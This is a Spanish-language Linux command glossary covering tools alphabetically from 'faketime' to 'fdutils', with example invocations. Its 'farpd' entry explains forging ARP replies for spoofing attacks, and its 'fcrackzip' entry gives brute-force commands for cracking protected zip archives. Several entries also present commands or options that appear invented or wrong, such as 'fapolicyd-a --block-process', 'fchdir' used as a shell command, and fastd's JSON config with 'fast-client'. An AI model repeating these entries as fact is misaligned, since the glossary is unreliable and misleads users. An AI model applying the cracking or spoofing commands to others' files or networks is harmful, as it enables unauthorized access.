$ faketime "2022-06-15 08:30:00" ./generar_informe.sh (con un programa que genera un informe basado en la fecha actual, simular diferentes fechas para probarlo)
$ faketime "2 years ago" date (usar formatos relativos: como "1 day ago" [hace 1 día] o "2 years ago" [hace 2 años])
$ faketime "12:30:00" date (solo cambiar la hora pero mantener la fecha actual)


falco
Detectar comportamientos sospechosos. Falco usa reglas predefinidas en /etc/falco/falco_rules.yaml para detectar anomalías que podrian verse en los logs de /var/log/falco.log. Descargar de https://falco.org/docs/setup/download/
# systemctl status falco (comprobar si está activo)


falcosecurity-scap-dkms
Módulo del kernel que falco [ver] y sysdig [ver] utilizan para recopilar datos.
$ lsmod | grep falco (verificar que el módulo esté cargado)


false
Este comando no hace nada excepto devolver un estado de salida 1 (fail). Se utiliza como marcador de posición en scripts.


falselogin
Tipo de 'shell' que no permite al usuario iniciar sesión.
$ falselogin (muestra el mensaje, que puede modificarse, de /etc/falselogin.conf)
$ falselogin --wait 5 (espera 5 segundos antes de cerrarse)


fallocate
Manipular el espacio de disco asignado a un archivo.
$ fallocate -l 20G archivo.txt (Como si el archivo.txt tuviera 20G)


fancontrol
Este paquete contiene un demonio que calcula la velocidad del ventilador a partir de la temperatura y configura las salidas PWM correspondientes a los valores calculados. Esto resulta útil cuando la BIOS o ACPI no ofrecen esta función, lo que normalmente debería ocurrir en un portátil. Incluye la herramienta pwmconfig.
# pwmconfig (si hay módulos de sensor compatibles con PWM [Pulse Width Modulation - PWM] instalados los buscará y probará cada uno para ver si controla un ventilador en la placa base
# fancontrol file.conf (arranacr el daemon con el archivo de cofiguración creado con el comando anterior)


fapolicyd
Daemon de Política de Acceso a Archivos. Fapolicyd es un daemon, que funciona como un firewall de archivos y determina si puede accederse a ellos basándose en una base de datos de confianza y atributos de archivo o proceso. Puede utilizarse para bloquear o habilitar el acceso y la ejecución de archivos.
# systemctl status fapolicyd (verificar el estado del servicio)
# fapolicyd-a --add /Docmentos/emacs (habilitar)
# fapolicyd-a --remove /Documentos/porn (deshabilitar)
# fapolicyd-a --block-process 1234 (bloquear un proceso específico)
# fapolicyd-a --allow-process 5678 (permitir acceso a un proceso específico)
# fapolicyd-info /ruta/al/archivo (mostrar información sobre un archivo específico)
# fapolicyd-cmd clear-cache (limpiar la caché de fapolicyd)
# journalctl -u fapolicyd (verificar el registro de eventos)


far2l
Clon de FAR Manager para Windows, similar, pero más potente que Norton Commander/Midnight Commander.
$ far2l


farpd
Daemon que se utiliza para crear respuestas ARP [Address Resolution Protocol] falsas en una red. Puede ser utilizado para realizar ataques de tipo ARP spoofing.
$ farpd -i eth0 (especifica la interfaz de red que farpd debe utilizar para obtener la dirección MAC que se usará en las respuestas ARP)
$ farpd -i eth0 -r 192.168.1.0/24 (indica que farpd solo responderá a solicitudes ARP para direcciones IP en el rango 192.168.1.0 a 192.168.1.255)
$ farpd -i eth0 -d (hará que farpd se ejecute en segundo plano, liberando la terminal)
$ arping -I eth0 192.168.1.100 (si farpd está configurado para responder a 192.168.1.100, debería verse una respuesta ARP con la dirección MAC de la interfaz eth0)


fasd
[f[files], a[files/directories], s[show/search/select], d[directories]]. Impulsor de productividad que ofrece acceso rápido a archivos y directorios para shells POSIX. Registra los archivos y directorios a los que se ha accedido, para que se puedan referenciar rápidamente en la línea de comandos. fasd registra los archivos y directorios que se han usado con comandos como cd, vim, ls, cat, etc.
$ echo 'eval "$(fasd --init auto)"' >> ~/.bashrc (agregarlo a la shell para que se cargue automáticamente al iniciar sesión)
$ source ~/.bashrc (recargar la configuración)
Si se ha trabajado en ~/Documentos/emacs, des de cualquier directorio se puede saltar a él con:
$ fasd -d emacs
O con la versión abreviada:
$ z emacs
$ fasd -l (muestra los archivos y directorios registrados, ordenados por frecuencia de uso)
$ fasd -f notas.txt (Si se ha trabajado con notas.txt en distintos directorios, abrir el más frecuente)
$ vim `fasd -f notas.txt` (abrir un archivo con vim)
$ v notas.txt (o usando la versión abreviada si se ha configurado el alias v='fasd -e vim')
$ fasd -R ~/.emacs.d/ notes (buscará notes dentro de un directorio especifico)
Además del alias mencionado de vim se pueden añadir a .bashrc otros:
       alias j='fasd -d'  # Para saltar a directorios
       alias v='fasd -e vim'  # Para abrir archivos con vim
       alias o='fasd -e xdg-open'  # Para abrir archivos con el visor predeterminado
$ fasd -fl | fzf (con fzf instalado, mostrará los archivos y directorios en un selector interactivo)


fasm
Ensamblador rápido y autocompilable de lenguaje ensamblador para procesadores de arquitectura x86 y x86-64, que realiza múltiples pasadas para optimizar el tamaño del código máquina generado.
$ fasm file.asm file (generará un archivo ejecutable llamado file a partir de un archivo en código ensamblador)
$ fasm file.asm file.exe (generará un archivo file.exe para windows a partir del archivo en código ensamblador)
$ fasm boot.asm boot.bin (generará un archivo boot.bin que puede ser usado como un bootloader para un sistema x86)


fastd
Daemon VPN [Virtual Private Network] que ofrece una forma rápida y segura de crear túneles VPN que se popularizó en dispositivos pequeños como routers.
Ejemplo de archivo de configuración JSON para definir las conexiones VPN:
# nano /etc/fastd/config.json
       { "interfaces": {
           "eth0": {
           "mode": "tun",
           "address": "10.0.0.1/24"
           }
       },
       "connections": [
           {
             "name": "lan",
             "remote_address": "192.168.1.100:7128",
             "local_address": "10.0.0.2:7128",
             "key": "your_secret_key_here"
           }
         ]
        }
Este ejemplo configura una interfaz Ethernet [eth0] en modo TUN y establece una conexión VPN con otro dispositivo remoto.
# systemctl start fastd (iniciar el servicio)
# systemctl enable fastd (que inicie al arrancar el sistema)
# systemctl status fastd (verificar el estado)
# fast-client --config /path/to/config.json (conectar a una red VPN remota)
# fast-server --config /path/to/config.json (permitir conexiones entrantes desde otros dispositivos)


fastddsgen
[fastdds-gen]. Generador de código fuente IDL [Interface Definition Language - lenguaje de definición de interfaz] para eProsima FastDDS. eProsima FastDDS-Gen es una aplicación Java que genera código fuente para eProsima FastDDS utilizando los tipos de datos definidos en un archivo IDL. Este código fuente generado puede usarse en cualquier aplicación FastDDS para definir el tipo de datos de un tema, que posteriormente se usará para publicar o suscribirse. Precisa tener instalado eProsima FastDDS en el sistema.
$ fastdds-gen file.idl (generará un archivo file.cpp y un archivo file.h)
$ fastdds-gen -o /tmp/mi_interfaz.cpp -d /tmp mi_interfaz.idl (generar código fuente en un archivo llamado mi_interfaz.cpp en el directorio /tmp)


fastep
Herramienta diseñada para optimizar la carga de los entry_points en proyectos de Python, específicamente en el archivo setup.py. Los entry_points son una forma de definir comandos ejecutables o plugins en un paquete de Python.
Dentro de la carpeta del proyecto:
$ fastep
Asegura que fastentrypoints esté incluido en MANIFEST.in y setup.py incluendo la linea "import fastentrypoints"


fastfech
Herramienta para obtener información del sistema y mostrarla de una manera atractiva.
$ fastfetch
$ fastfetch --list-config-paths (muestra el listado de los archivos de configuracion de la aplicación)
$ fastfetch --list-logos (llistado de logos disponible en la aplicación)
$ fastfetch -d arch (muestra información del sistema sea la distro que sea pero con el logo de arch)


fastnetmon
Herramienta que analiza el tráfico de red en tiempo real para identificar patrones anómalos, como un volumen elevado de paquetes, bytes o flujos por segundo, que suelen indicar un ataque DDoS y reaccionar rápidamente ante ellos, ya sea notificando al administrador, apagar un servidor o bloquear al cliente. Está construido sobre múltiples motores de captura de paquetes, como NetFlow, IPFIX, sFlow y mirroring [SPAN], lo que lo hace muy eficiente y escalable.
Configuración básica:
# nano /etc/fastnetmon.conf
       # Habilitar captura de tráfico vía NetFlow
       netflow_enabled = yes
       netflow_port = 2055
       netflow_host = 127.0.0.1
       #
       # Umbrales para detectar ataques (ajusta según tu red)
       threshold_pps = 10000       # Paquetes por segundo
       threshold_mbps = 100        # Megabits por segundo
       #
       # Acciones al detectar un ataque
       ban_enabled = yes           # Habilita bloqueo
       ban_for_pps = yes           # Bloquea por exceso de paquetes por segundo
       ban_for_bandwidth = yes     # Bloquea por exceso de ancho de banda
       ban_script = /usr/local/bin/notify_attack.sh # script que se ejecuta
# systemctl restart fastnetmon (reiniciar el servicio despues de cualquier modificación del archivo de configuración)
# fastnetmon --sflow 6343 (si la red usa sFlow, FastNetMon analizará el tráfico sFlow y detectará anomalías)
1.-
Detección de un ataque DDoS con NetFlow
Supongamos que se tiene un router enviando datos NetFlow a FastNetMon. El router envia el tráfico a la IP del servidor donde corre FastNetMon, por ejemplo, 192.168.1.10, puerto 2055. Iniciar FastNetMon:
# fastnetmon --netflow 2055
FastNetMon comenzará a analizar el tráfico. Si un host, digamos, 192.168.1.100, envía más de 10.000 paquetes por segundo, según el umbral configurado, FastNetMon lo detectará como un ataque y, si ban_enabled está activado, ejecutará la acción definida, por ejemplo, un script para notificar o bloquear.
La salida esperada en logs [/var/log/fastnetmon.log] podría ser parecida a:
          2025-03-18 08:00:00 - Attack detected: IP 192.168.1.100, 15000 pps, 120 Mbps
          2025-03-18 08:00:01 - Banning IP 192.168.1.100
2.-
El script de notificación podría ser
# nano /usr/local/bin/notyfy_attack.sh
echo "Ataque detectado desde $1 a las $(date)" | mail -s "Alerta DDoS" admin@tured.com
3.-
Mitigación con BGP [Border Gateway Protocol] Blackholing
FastNetMon puede integrarse con BGP para mitigar ataques redirigiendo el tráfico a un "agujero negro".
# nano /etc/fastnetmon.conf
Añadir las lineas:
       bgp_enabled = yes
       bgp_next_hop = 192.168.1.1
       bgp_community = 65535:666  # Comunidad estándar para blackholing (RFC 7999)
Cuando detecte un ataque, FastNetMon anunciará la IP atacante al router BGP y que descartará el tráfico.
# fastnetmon


fastp
Herramienta de preprocesamiento de datos de secuenciación en formato FASTQ, que se utiliza en bioinformática para limpiar y mejorar la calidad de las lecturas antes del análisis posterior. Está diseñada para proporcionar preprocesamiento ultrarápido single-end [un solo extremo - SE] y paired-endd [extremo emparejado - PE] para datos FastQ con útiles funciones de control de calidad y filtrado.
$ fastp -i input.fastq -o output.fastq (recorta y limpia las secuencias de un archivo de entrada input.fastq y genera un nuevo archivo output.fastq)
$ fastp -i R1.fastq -I R2.fastq -o R1_clean.fastq -O R2_clean.fastq (procesa dos archivos R1.fastq y R2.fastq [lecturas forward y reverse] y genera archivos limpios)
$ fastp -i input.fastq -o output.fastq -q 20 (recorta bases con una calidad inferior a Q20 en los extremos de cada secuencia)
$ fastp -i input.fastq -o output.fastq --detect_adapter_for_pe (detecta y elimina adaptadores automáticamente en lecturas paired-end - PE)
$ fastp -i input.fastq -o output.fastq -l 30 (descarta todas las lecturas con una longitud inferior a 30 bases)
$ fastp -i input.fastq -o output.fastq -h report.html -j report.json (guarda un informe de calidad interactivo en report.html y un archivo report.json con las estadísticas)
$ fastp -i input.fastq -o output.fastq -w 8 (usa 8 hilos en paralelo para acelerar el procesamiento)
$ fastp -i R1.fastq -I R2.fastq -o R1_clean.fastq -O R2_clean.fastq --correction (Corrige errores en las lecturas paired-end utilizando información de ambas lecturas)


fasttrack-archive-keyrin
Hace referencia a una clave de archivo GnuPG [GNU Privacy Guard] que se utiliza para firmar digitalmente los archivos de lanzamiento del repositorio Debian FastTrack. Esto es parte de un mecanismo de seguridad que garantiza la integridad y autenticidad de los paquetes que se descargan desde dicho repositorio. El repositorio Debian FastTrack es un repositorio adicional que proporciona paquetes de software que no están disponibles en los repositorios oficiales de Debian, o que ofrecen versiones más recientes de ciertos paquetes. Es comúnmente utilizado por usuarios que necesitan software específico o actualizado que no se encuentra en los repositorios estándar.
Agregar las lineas
# nano /etc/apt/sources.list
       deb https://fasttrack.debian.net/debian-fasttrack/ bookworm-fasttrack main contrib
       deb https://fasttrack.debian.net/debian-fasttrack/ bookworm-backports-staging main contrib
# apt update
1.-
Para consultar los paquetes disponibles en los repositorios fasttrack:
# apt install devscripts
$ nano ~/.devscripts (crear o editar el archivo)
Añadir la linea
       RMADISON_URL_MAP_FASTTRACK=https://fasttrack.debian.net/api/madison
# rmadison -u fasttrack gitlab (consultar los paquetes fasttrack)


fatattr
Permite ver y/o modificar los atributos MSDOS en un sistema de archivos FAT empleando los signos + para otorgar y - para quitar. Dichos premisos son:
    r (Solo lectura)
    a (Archivo)
    s (Archivo del sistema)
    h (Oculto)
    d (Directorio)
    v (Etiqueta de volumen)
$ fatattr /media/usb1/* (Muestra los atributos)
$ fatattr -s /media/usb1/* (Quita el atributo oculto de todo el usb)
$ fatattr +s /media/usb1/* (Oculta todos los archivos del usb)


fatcat
Herramienta forense para explorar, extraer, reparar y analizar sistemas de archivos FAT [File Allocation Table]
# fatcat /dev/sdX1 (explorar un dispositivo FAT)
# fatcat --extract /dev/sda1 /extracción_sda1 (intentará extraer todos los archivos de la partición FAT en el directorio especificado)
# fatcat --analyze /dev/sda1 (mostrará información detallada sobre la estructura de la partición, incluyendo tamaño, número de entradas de directorio, etc.)
# fatcat --repair /dev/sda1 (intenta restaurar la estructura de archivos si está dañada)
# fatcat --find /dev/sda1 "nombre_del_archivo" (buscará el archivo especificado en la partición FAT)


fatlabel
Establecer u obtener la etiqueta del sistema de archivos MS-DOS o la ID del volumen. Para otros sistemas existen los comandos: ntfslabel [NTFS], e2label [Ext2, Ext3 y Ext4] y BTFS [ver].
# fatlabel /dev/sda1 (Obtener la etiqueta de una partición FAT32)
# fatlabel /dev/sda1 etiqueta (establecer "etiqueta" a la partición)
# ntfslabel /dev/sda3 etiqueta (lo mismo en un sistema NTFS)


fatrace
Reporta eventos de acceso a archivos de todos los procesos en ejecución. Su objetivo principal es detectar procesos que reactivan el disco innecesariamente, impidiendo así el ahorro de energía. Incluye la herramienta power-usage-report.
# fatrace (de forma general)
# fatrace -s 10 -C emacs -o salida (durante 10 segundos solo del proceso emacs y guardado el informe en "salida")
# power-usage-report


fatresize
Redimensionador de sistemas de archivos FAT16/FAT32 de forma no destructiva.
# fatresize -s 500M /dev/sdb1 (reducirá el tamaño del sistema de archivos FAT32 en el dispositivo `/dev/sdb1` a 500 megabytes)
# fatresize -s 2000M /dev/sdc1 (aumentará el tamaño del sistema de archivo FAT16 en el dispositivo `/dev/sdc1` a 2000 megabytes)
# fatresize -s 750M -v /dev/sdd1 (mostrará información detallada sobre el proceso de redimensionamiento)
# fatresize -s 1500M -f /dev/sde1 (intentará redimensionar el sistema de archivos FAT32 en `/dev/sde1` a 1500 megabytes, ignorando cualquier error que pueda surgir)


fatsort
Herramienta que se utiliza para ordenar las entradas de directorio en particiones FAT16 y FAT32. Lee el sector de arranque y ordena la estructura de directorios recursivamente, si hay problemas en la estructura del directorio, fatsort puede ayudar a repararlos al reordenar las entradas y puede manejar nombres de archivo que superen los 8.3 caracteres, que es una limitación de los sistemas de archivos más antiguos.
# fatsort /dev/sda1 (ordenar el directorio de una particion FAT y mostrar mensajes sobre el progreso de la operación)


faucc
Compilador de C que genera código Intel para CPU de 16/32 bits útil para compilar código en modo real, como una BIOS aunque este caso no es muy común en sistemas modernos.
$ faucc -m16 ejemplo.c -o ejempl16.bin (compilar un programa en modo 16 bits y guardarlo en ejemplo16.bin)
$ faucc -m32 ejemplo.c -o ejempl32.bin -Wall -Werror (compilar uno de 32 bits, guardarlo en ejemplo32.bin, activar todas las advertencias y convertirlas en errores)


fauhdlc
Compilador e intérprete experimental de VHDL [VHSIC Hardware Description Language], un lenguaje de descripción de hardware usado en el diseño de circuitos electrónicos que permite simular y probar diseños antes de su implementación en hardware físico. fauhdlc se encuentra aún en una fase experimental muy temprana, donde muchas construcciones de VHDL aún no cuentan con soporte adecuado.
$ fauhdlc and_gate.vhdl (compilar un archivo y si hay errores en la sintaxis, se mostrarán en la terminal)
$ fauhdlc and_gate.vhdl and_gate_tb.vhdl (compilar y ejecutar la simulación)
$ fauhdlc --list and_gate.vhdl (imprimirá una lista de entidades, arquitecturas y paquetes definidos)


faultstat
Herramienta que permite monitorear la actividad de fallos de página de los procesos que se ejecutan en un sistema. Los fallos de página ocurren cuando un proceso intenta acceder a una página de memoria que no está actualmente en la memoria RAM, lo que obliga al sistema operativo a traer esa página desde el disco [swap o archivos mapeados en memoria] y eso puede afectar el rendimiento del sistema, especialmente si ocurre con frecuencia.
$ faultstat (resumen de los fallos de página desde el inicio del sistema que incluirá el número de fallos de página, menores, que no requieren acceso a disco y mayores, que sí requieren acceso a disco)
$ faultstat -l (mostrar información completa de comandos)
$ faultstat -c (información de comandos del campo de comunicación de los procesos)
$ faultstat -t (modo interactivo)
$ faultstat -s (información corta de comandos)
$ faultstat -T (mostrar los principales procesos con fallos de página según el total de fallos de página)
Un ejemplo de salida podría ser:
       PID  Major   Minor    Swap  User       Command
      3261  13702    9112k  12700  pep        /usr/lib/chromium/chromium
      3699   1235    7764k  14480  pep        /opt/brave.com/brave/brave
      3209  62232    7500k  36488  pep        /usr/lib/chromium/chromium
      2204  12557    7375k 115948  pep        firefox
      2404    915    6325k  11272  pep        /usr/lib/firefox/firefox-bi
En este ejemplo, indicaría que chrome y firefox son los procesos que están generando más fallos de página, con chromium teniendo un número significativo de fallos mayores, lo que podría indicar que está accediendo a mucha memoria que no está en RAM y necesita ser traída desde el disco.


fbb
implementación de un BBS [Bulletin Board System] para radioaficionados, especialmente para su uso con radio por paquetes [AX.25]. Este software permite a los operadores de radioaficionados administrar un sistema de mensajería y almacenamiento para la comunicación digital. Incluye las herramientas xfbbd [Es el demonio principal del sistema de BBS], ajoursat [Permite actualizar los datos de los satélites usados en la configuración de fbb], fbbgetconf [Extrae la configuración actual del sistema FBB BBS], satdoc [Muestra documentación relacionada con el seguimiento de satélites]. satupdat [Actualiza los datos orbitales de los satélites (TLE) para su uso en FBB] y sfbbC [Herramienta auxiliar para manipulación de la base de datos del BBS].
# xfbbd (iniciar el demonio)
$ ps aux | grep xfbbd (verificar que está corriendo)
$ fbbgetconf (mostrará los valores de configuración)
$ satupdat (descargará la última información de satélites)
$ satdoc (mostrará información útil sobre cómo usar fbb con comunicaciones satelitales)
$ ajoursat (revisa y actualiza los archivos de configuración relacionados con satélites en el sistema FBB)
$ sfbbC -check (verificar la integridad de la base de datos)
$ sfbbC -repair (intentar reparar si hay errores en la base de datos)xs


fbcat
Hace una captura de pantalla de un framebuffer [salida de la consola] y la almacena en un archivo PPM [Portable PixMap].
$ fbcat > screenshot.ppm (desde una consola de las X hace captura de la /dev/tty1 y guarda la imagen en captura.ppm)
$ fbcat | pnmtopng > screenshot.png (evita crear un archivo intermedio en PPM y guarda directamente en PNG)
$ fbcat | convert ppm:- screenshot.jpg (ppm:- indica que la entrada proviene de stdin y la convierte a .jpg con "convert" de ImageMagick)


fbcmd
[php5-cli php5-curl]. Cliente de línea de comandos para Facebook.
$ php -r 'echo phpversion();' (Comprobar si php5 está instalado)
$ php -r 'phpinfo();' | grep -i curl (Comprobar si php tiene soporte para curl)
$ wget https://raw.github.com/dtompkins/fbcmd/master/fbcmd_update.php (Descargar fbcmd)
$ php fbcmd_update.php (Preparar la instalación)
$ php fbcmd_update.php sudo
$ php fbcmd_update.php
$ fbcmd (Arrancar la aplicación. Mostrará una url del tipo https://www.facebook.com/dialog/oauth?client_id=424....)
Entrar en fecebook con la url mencionada y aceptar la conexión de la aplicación. Mostrará un código XXXXX
$ fbcmd auth XXXXX (Autentificarse con el código)
Aceptar los terminos que nos proponen y acabar la configuración.
$ fbcmd update (Actualizar la versión)
$ fbcmd post "Estoy posteando en consola" (Enviar una entrada)
$ fbcmd target USER post "Texto al muro de USER"
$ fbcmd @USER post "Texto al muro de USER"
$ fbcmd fstatus (Ver estado de tus amigos)
$ fbcmd fonline (Mostrar los amigos que están actualmente en línea)
$ fbcmd stream (Mostrar streaming de los amigos)
$ fbcmd comment 5 "texto de comentario" (Agregar un comentario)


fbgrab
Realizar pantallazos desde las X y desde las tty1-6
# fbgrab -s 2 pantallazo.png   (pantallazo despues de 2 segundos)
# fbgrab -C 3 captura.png (desde las X a la tty 3)


fbgs
Visualizar pdf usando framebuffer [sin X]
$ fbgs -c archivo.pdf  (visualizarlo en color)
Opciones:
	-l  (Ampliación a 100 dpi (75 dpi por defecto)
	-xl (a 12 dpi)
	-xxl (a 150 dpi)
	-p contraseña (Si el pdf requiera contraseña)


fbi
Visualizar imagenes usando framebuffer [sin X]. Precisa root.
# fbi -t 3 *   (visualizar 3 segundos todas las imágenes del directorio)
Si sale una nota: ioctl VT_GETSTATE: Invalid argument [not a linux console?] :
# fbi -vt 01 imagen


fbless
Lector de libros electrónicos FictionBook [fb2], que es un formato XML utilizado para ebooks, libres de DRM [Digital Rights Management - Gestión de derechos digitales].
$ fbless libro.fb2 (abrirá el archivo en la interfaz de "fbless")


fbset
Mostrar y modificar la configuración de los dispositivos framebuffer.
# fbset -i  (Muestra toda la información disponible)
# fbset -s  (visualizar la configuración en modo vídeo)


fbsetbg
Herramienta para colocar fondos de pantalla en escritorios minimalistas: fluxbox, openbox...
$ fbsetbg -l $HOME/imagenes/imagen.png (colocar fondo)
$ fbsetbg -i (información sobre el “setter” [feh, esetroot...] usado)


fbterm
Terminal basada en framebuffer [tty].
$ fbterm -f 0 -b 2 -s 20 (Color de fuente[-f] negra[0], fondo[-b] verde[2] y fuente[-s] de 20 pixels)
$ fbterm -r 2 -n Purisa (invierte la terminal y usa fuente Purisa [-n]. Listado de fuentes posibles con fc-list)
Nota.- Con Ctrl+d la terminal vuelve a su condición anterior.
Colores permitidos [-f, -b]:
0 = negro, 1 = rojo, 2 = verde, 3 = marrón, 4 = azul, 5 = magenta, 6 = cyan, 7 = blanco
Rotaciones de terminal posibles (-r):
0 = 0º , 1 = 90º, 2 = 180º, 3 = 270º


fbtv
Visualizar la webcam por las tty.
# fbtv -f /usr/share/consolefonts/Lat2-Fixed13.psf.gz -c /dev/video0


fbv
Visualizar imágenes en framebuffer.
$ fbv imagen


fc
Mostrar/abrir nuevamente el último comando/archivo abierto o ejecutado. La diferencia con history [ver] es que fc sólo muestra los ultimos comandos ejecutados y no todos.
$ fc -l (Mostrar los últimos comandos usados por el usuario)
$ fc 534 (Edita el comando con el pid 534 y lo ejecuta nuevamente)
$ !! (Ejecuta el último comando)
$ !n (Ejecuta el comando número n)
$ !dialog (Ejecuta el último comando que empiece por dialog)


fc-cache
Regenerar la cache de fuentes instaladas
$ fc-cache -f -v


fchdir
Es idéntico a chdir con la única diferencia de que el directorio se proporciona como un descriptor de archivo abierto, es decir que devuelve 0 si puede ir al directorio especificado o 1 si no.
$ fchdir /ust/local/bin (devolverá 1)


fc-list
Listar todas las fuentes disponibles.
$ fc-list | cut -d ':' -f 1 | sort -u  (de forma más clara)
$ fc-list > lista_fuentes.txt   (redirigir la lista de fuentes a un fichero)
$ fc-list | wc -l  (muestra el número de fuentes disponibles)
$ fc-list : family (listado de fuentes instaladas sin información de ruta)
$ fc-list :lang=es (identificar fuentes de un idioma con su ruta)
$ fc-list :lang=es family (identificar fuentes de un idioma sin información de ruta)
$ fc-list : family style (identificar los estilos de cada fuente tipográfica: negrita, regular, cursiva, etc.)
$ fc-list :mono (listado de fuentes monoespaciadas)


fcgistarter
Iniciar un programa FastCGI. FastCGI es un protocolo para interconectar programas interactivos con un servidor web. El principal objetivo de FastCGI es reducir la carga asociada con el hecho de interconectar el servidor web y los programas Common Gateway Interface, permitiéndole a un servidor atender más peticiones a la vez.
# fcgistarter -c command.cgi -p port -i eth0 -N num


fcm
Herramientas para la gestión y compilación de código fuente, especialmente utilizado en entornos científicos y de modelado numérico. Incluye las aplicaciones [varias con interfaz gráfica] fcm_graphic_diff, fcm_graphic_merge, fcm_gui, fcm_internal, fcm_test_battery, fcm-add-svn-repos, fcm-add-svn-repos-and-trac-env, fcm-add-trac-env, fcm-backup-svn-repos, fcm-backup-trac-env, fcm-commit-update, fcm-daily-update, fcm-install-svn-hook, fcm-manage-trac-env-session, fcm-manage-users, fcm-recover-svn-repos, fcm-recover-trac-env, fcm-rpmbuild, fcm-user-to-email y fcm-vacuum-trac-env-db.
$ fcm add archivo.f90 (agrega un archivo o directorio al control de versiones)
$ fcm checkout https://repositorio.ejemplo.com/proyecto (clona un repositorio SVN)
$ fcm commit -m "Actualización de parámetros físicos" (envía cambios al repositorio)
$ fcm build (compila un proyecto según su configuración)
$ fcm diff archivo_modificado.f90 (compara cambios con la versión del repositorio)
$ fcm merge rama-nueva (fusiona cambios desde otra rama)
$ fcm_graphic_diff archivo1.f90 archivo2.f90 (herramienta gráfica para ver diferencias entre archivos)


fcoe-utils
Herramientas que permiten configurar y gestionar Canal de Fibra sobre Ethernet. Contiene fcoeadm [configurar interfaces Fibre Channel Over - FCoE] y fcoemon [servicio para configurar filtros DCB [Data Center Bridging] Ethernet Quality Of Service - QOS]
# systemctl enable fcoemon (habilitar el demonio FCoE para que se inicie automáticamente al arrancar)
# fcoeadm -i (listar las interfaces de red que son capaces de soportar FCoE)
# fcoeadm -c eth0 (crear una interfaz FCoE en eth0)
# fcoeadm -t (mostrará los objetivos [targets] FCoE disponibles)
# fcoeadm -s (mostrar información como el estado de la interfaz, el WWN [World Wide Name] y otros detalles)
# fcoeadm -d eth0 (eliminará la configuración FCoE de la interfaz)


fcrackzip
Craquear zips protegidos
$ fcrackzip -c aA1 -l 5 archivo_protegido.zip
$ fcrackzip -b -c a -u -l 1-6 archivo_protegido.zip
-c aA1!  (Prueba minúsculas, mayúsculas, números y caracteres especiales [!:$%&/()=?{[]}+*~#])
-c a (Que pruebe solo minúsculas de la a a la z)
-l 3-5  (Entre 3 y 5 caracteres)
-b  (fuerza bruta)
-u  (utilice unzip para eliminar contraseñas incorrectas)


fd
[fdclone]. Gestor de archivos minimalista sin soporte para colores, acentos y letra "ñ"
Algunos atajos:
	Flechas (Desplazamiento)
	1 (Muestra los archivos en una columna)
	2 (Muestra los archivos en dos columnas)
	3 (Muestra los archivos en tres columnas)
	l (Ir a)
	t (Muestra el árbol de carpetas)
	u (Descomprimir usando el descompresor de FD)
	a (Cambia las propiedades de un archivo.
	i (Información del disco duro actual)
	p (Comprime un o varios archivos)
	h (Ejecutar un comando)
	F (Buscar de forma recursiva)
	/ (Partir la pantalla en dos)
	K (Cerrar pestaña)
	^ (Cambia de pestaña)
	E (Abre preferencias)


fd-find
Alternativa sencilla, rápida e intuitiva a find con algunas características propias como que, por defecto, es insensible a mayúsculas y minúsculas y omite los archivos y directorios ocultos
$ fdfind emacs (buscar todos los archivos que contengan la palabra mencionada en su nombre)
$ fdfind bash /etc (busca archivos que tengan "bash" en el nombre en el directorio /etc)
$ fdfind -s emacs (lo mismo pero "case sensitive")
$ fdfind -e txt (busca todos los archivos con extensión .txt)
$ fdfind -e md /home/usuario/docs (busca archivos con la extensión .md dentro del directorio /home/usuario/docs)
$ fdfind -td conf (busca solo directorios cuyo nombre contenga "conf")
$ fdfind -tf -e jpg (busca solo archivos con extensión .jpg)
$ fdfind '^archivo.*log$' (busca archivos cuyo nombre comience con "archivo" y termine en "log")
$ fdfind -H .gitkeep (busca el archivo .gitkeep, incluyendo archivos y directorios ocultos)
$ fdfind -x chmod 644 {} (busca archivos y directorios, y para cada uno ejecuta el comando chmod 644 sustituyendo {} por la ruta del archivo)
$ fdfind -tf -e log -X rm (busca archivos con extensión .log y los elimina por lotes)
$ fdfind -H -i -t f archivo (buscar un archivo incluyendo en la busqueda los archivos ocultos y sin distinción de mayúsculos y minúsculas)
$ fdfind -a -c auto -t x ejecutable (indicar toda la ruta de un ejecutable y mostrarlo con color automático)


fdb5
[Fields DataBase] Herramienta desarrollada por el Centro Europeo de Predicción Meteorológica a Medio Plazo (ECMWF) para almacenar, indexar y recuperar datos GRIB. Cada mensaje GRIB se almacena como un campo y se indexa mediante metadatos semánticos, es decir, variables físicas como temperatura, presión, etc. Está orientado a profesionales y organizaciones que manejan grandes volúmenes de datos meteorológicos en formato GRIB.
$ fdb5 ls base_de_datos (muestra una lista de todos los campos almacenados en la base de datos especificada)
$ fdb5 get --param temperatura --level 850 --date 20250321 --time 12:00 /ruta/a/tu/base/de/datos (recupera el campo de temperatura al nivel 850 hPa para el 21 de marzo de 2025 a las 12:00 horas)
$ fdb5 put --param humedad --level 700 --date 20250321 --time 00:00 --file archivo.grib base_de_datos (inserta un archivo GRIB que contiene datos de humedad al nivel 700 hPa para el 21 de marzo de 2025 a las 00:00 horas en la base de datos)
$ fdb5 rm --param viento --level 500 --date 20250320 --time 06:00 /ruta/a/tu/base/de/datos (elimina el campo de viento al nivel 500 hPa para el 20 de marzo de 2025 a las 06:00 horas de la base de datos)


fdformat
Formatear disquetes.
# fdformat -n /dev/fd0 (sin verificar)
# fdformat -r /dev/fd0 (reparar el formateo)


fdisk
Particionar discos.
# fdisk -l (Lista las particiones de todos los discos y entra en el promtp del comando)
Algunas teclas que pueden usarse:
	d   (Suprime una partición)
	l   (Lista los tipos de particiones conocidos)
	m   (Imprime este menú)
	n   (Añade nueva partición)
	o   (Crea una nueva tabla de particiones DOS vacía)
	p   (Imprime la tabla de particiones)
	q   (Sale sin guardar los cambios)
	v   (Verifica la tabla de particiones)
	w   (Escribe la tabla en el disco y sale)
Y seguir las instrucciones que aparecen en pantalla.


fdpowermon
[fdpowermon-icons]. Script de Perl sencillo que instala un icono en la bandeja del sistema que muestra el nivel de bateria y se actualiza cada 3 segundos.
$ fdpowermon


fdupes
Buscar archivos duplicados.
$ fdupes -n -r .  (Del directorio actual y los subdirectorios y descartando los ficheros vacios)
$ fdupes -q -d -S .  (Del directorio actual por medida, oculta el indicador de progreso y borrar los duplicados)
$ fdupes -s -h . (Comprueba los enlaces simbolicos y los enlaces fuertes)


fdutils
